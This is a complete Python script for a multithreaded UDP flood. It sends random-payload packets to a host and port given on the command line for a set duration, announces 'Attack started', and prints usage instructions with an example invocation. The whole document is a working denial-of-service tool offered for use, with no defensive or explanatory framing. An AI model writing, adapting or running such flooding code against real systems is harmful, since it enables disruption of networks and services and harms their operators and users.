import sys
import socket
import time
import random
import threading
import getpass
import os


def udpsender (host, port, timer, punch):

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	print("Attack started to: " + host + ":" + str(port))

	while time.time() < timeout:
		sock.sendto(punch, (host, int(port)))

try:
	ip = sys.argv[1]
	port = int(sys.argv[2])
	timer = sys.argv[3]
	punch = random._urandom(int(sys.argv[4]))
	threads = sys.argv[5]
	print(port)
	for x in range(int(threads)):
		t = threading.Thread(target=udpsender, args=(ip, port, timer, punch,))
		t.daemon = True
		t.start()

	time.sleep(int(timer))

except IndexError:
	print("Usage: python " + sys.argv[0] + " host port time packet_size threads")
	print("Example: python "+sys.argv[0]+" 127.0.0.1 80 60 50000 10")